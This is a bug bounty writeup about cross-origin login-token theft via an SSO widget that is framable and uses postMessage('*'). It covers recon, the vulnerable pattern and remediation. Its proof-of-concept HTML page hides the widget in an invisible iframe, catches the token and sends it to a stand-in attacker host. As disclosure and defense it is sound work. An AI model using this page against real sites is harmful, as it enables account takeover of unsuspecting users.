# Cross-Origin Token Theft via a Framable SSO Widget and `postMessage("*")`

| Field | Value |
|---|---|
| Vulnerability class | Insecure cross-window messaging + missing framing protection |
| Weaknesses | CWE-346 (Origin Validation Error), CWE-1021 (Improper Restriction of Rendered UI Layers) |
| Severity (as submitted) | High, CVSS 3.1 8.1 |
| Impact | Account takeover via theft of a login token |
| Platform | HackerOne (private program) |
| Outcome | Valid, closed as Duplicate (an earlier researcher reported the same root cause first) |

> All names, hosts, identifiers and code in this writeup are placeholders. The target, its products and its infrastructure are intentionally not disclosed. Code samples are simplified illustrations of the pattern, not the original program's source.

---

## TL;DR

A company used one shared login widget (a small "single sign-on" page) across several of its apps. When a user finished logging in, the widget handed the login token back to the page that opened it using `window.postMessage(token, "*")`. The `"*"` means "deliver this message to whoever my parent window is, no matter what website it is." The widget page also had no framing protection, so any website could load it inside an invisible iframe. Put together, an attacker site could embed the widget, let it complete the login for a victim who already had a session, and receive the victim's token.

---

## Background: the two building blocks

**`postMessage`** is how two browser windows from different websites talk to each other (for example a page and an iframe inside it). The sender picks a `targetOrigin`. If it is a real origin like `https://app.example.com`, the browser only delivers the message if the receiving window really is that site. If it is `"*"`, the browser delivers it to anyone.

**Framing protection** is the `X-Frame-Options` header or the CSP `frame-ancestors` directive. These tell the browser "only these sites may put me inside an iframe." Without them, any site can embed the page.

Either problem alone is usually low impact. Together they create a direct data leak.

---

## Recon: how I found it

1. While mapping the login flow, I noticed every app redirected to the same hosted auth widget, loaded from a CDN path similar to:
   `https://cdn.example-auth.com/auth-widget/production/`
2. I pulled the widget's JavaScript bundle and searched for `postMessage(`. Every call that carried token data used `"*"` as the target origin.
3. I checked the widget's response headers. There was no `X-Frame-Options` and no `frame-ancestors` directive, so the page was framable from any origin.
4. The widget accepted a `client_id` parameter to decide which app it was logging into. Every `client_id` I tested shared the same messaging code, so the issue affected all apps using the widget.
5. The widget also had a post-login "exit" callback page that placed the token in the URL. That was a second leak path with the same root cause (the token being handed out without checking who receives it).

Simplified version of the vulnerable pattern:

```js
// Inside the auth widget, after a successful login
function onLoginSuccess(result) {
  const payload = { type: "AUTH_SUCCESS", accessToken: result.accessToken };

  // Vulnerable: "*" delivers the token to ANY parent/opener origin
  (window.opener || window.parent).postMessage(payload, "*");
}
```

---

## Proof of concept (lab-style illustration)

Tested only with my own accounts. The attacker page is hosted on a domain I control.

```html
<!-- https://attacker.example/steal.html -->
<!doctype html>
<html>
  <body>
    <!-- 1. Silently embed the victim company's login widget -->
    <iframe
      src="https://cdn.example-auth.com/auth-widget/production/?client_id=app-a"
      style="width:0;height:0;border:0;visibility:hidden">
    </iframe>

    <script>
      // 2. Listen for anything the widget broadcasts
      window.addEventListener("message", (event) => {
        if (event.data && event.data.accessToken) {
          // 3. The token arrives here even though this is NOT the real app
          fetch("https://attacker.example/log", {
            method: "POST",
            body: JSON.stringify({ from: event.origin, token: event.data.accessToken })
          });
        }
      });
    </script>
  </body>
</html>
```

**Steps**

1. Log in to the target app with test account A (this creates an active session with the auth provider).
2. In the same browser, visit `https://attacker.example/steal.html`.
3. The hidden widget completes its flow for the logged-in user and posts the token to the parent window.
4. The attacker page receives account A's token and sends it to the attacker's server.
5. Replaying that token against the app's API acts as account A.

Where the browser's cookie rules limit the iframe version, the same listener works with `window.open()` instead of an iframe, because the widget also posts to `window.opener` with `"*"`.

---

## Impact

- Any website the victim visits while logged in can steal a valid login token.
- The token grants access to the victim's account across every app that used the shared widget.
- No interaction is needed beyond visiting a link.

---

## Remediation

1. **Never use `"*"` for sensitive messages.** Send to an explicit, allow-listed origin per `client_id`:
   ```js
   const allowed = ALLOWED_ORIGINS[clientId];         // e.g. "https://app-a.example.com"
   (window.opener || window.parent).postMessage(payload, allowed);
   ```
2. **Block framing** of the auth widget: `Content-Security-Policy: frame-ancestors 'self' https://app-a.example.com` (plus `X-Frame-Options` for older browsers).
3. **Keep tokens out of URLs** on callback/exit pages. Use a short-lived one-time code exchanged server-side instead.
4. **Receivers should also check `event.origin`** before trusting a message.

---

## Lessons learned

- **Small issues stack.** "Missing framing header" and "postMessage with `*`" are both often closed as informational on their own. The finding was the combination and the sensitive data flowing through it.
- **Shared components multiply impact.** One widget used by many apps meant one bug affected all of them, which belongs in the impact section.
- **Speed matters on heavily tested programs.** This was a valid, high-impact bug that another researcher had already reported. On mature programs, auth widgets are the first thing people look at, so either report fast or look deeper than the obvious entry points.

---

## References

- [MDN: Window.postMessage() security concerns](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage#security_concerns)
- [OWASP WSTG: Testing Web Messaging (WSTG-CLNT-11)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging)
- [MDN: CSP frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)
- [CWE-346: Origin Validation Error](https://cwe.mitre.org/data/definitions/346.html)
